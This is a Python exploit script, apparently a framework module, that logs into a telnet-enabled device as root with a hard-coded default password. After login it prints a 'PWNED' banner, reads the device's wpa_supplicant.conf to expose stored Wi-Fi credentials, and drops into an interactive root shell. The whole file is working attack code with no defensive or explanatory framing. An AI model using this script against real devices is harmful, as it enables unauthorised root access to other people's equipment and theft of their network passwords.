#!/usr/bin/env python3
import telnetlib
import time
 
class Exploit:
    def run(
        self,
        ip,
        port=23,
        timeout=10
    ):
        e = Liandian()
        e.exp(ip,port,timeout)

class Liandian():
    def exp(self,host, port=23, timeout2=10):
        user = 'root'
        password = 'gzhongshi'
        wifi_conf_path = 'cat /tmp/wificonf/wpa_supplicant.conf'
        print(f"[+] Sending payload to {host}:{port} ...")
        tn = telnetlib.Telnet(host, port, timeout=timeout2)
        tn.read_until(b"login: ", timeout=timeout2)
        tn.write(user.encode() + b"\n")
        tn.read_until(b"Password:", timeout=timeout2)
        tn.write(password.encode() + b"\n")
        time.sleep(timeout2)
        output = tn.read_very_eager().decode(errors="ignore")
        if '#' in output:
            info = r'''
    _ (`-.   (`\ .-') /`     .-') _   ('-.  _ .-') _   
    ( (OO  )   `.( OO ),'    ( OO ) )_(  OO)( (  OO) )  
    _.`     \,--./  .--.  ,--./ ,--,'(,------.\     .'_  
    (__...--''|      |  |  |   \ |  |\ |  .---',`'--..._) 
    |  /  | ||  |   |  |, |    \|  | )|  |    |  |  \  ' 
    |  |_.' ||  |.'.|  |_)|  .     |/(|  '--. |  |   ' | 
    |  .___.'|         |  |  |\    |  |  .--' |  |   / : 
    |  |     |   ,'.   |  |  | \   |  |  `---.|  '--'  / 
    `--'     '--'   '--'  `--'  `--'  `------'`-------'  '''     
            print(info)
            tn.write(wifi_conf_path.encode() + b"\n")
            tn.interact()
        else:
            print("[!] Vulnerability does not exist")
    

 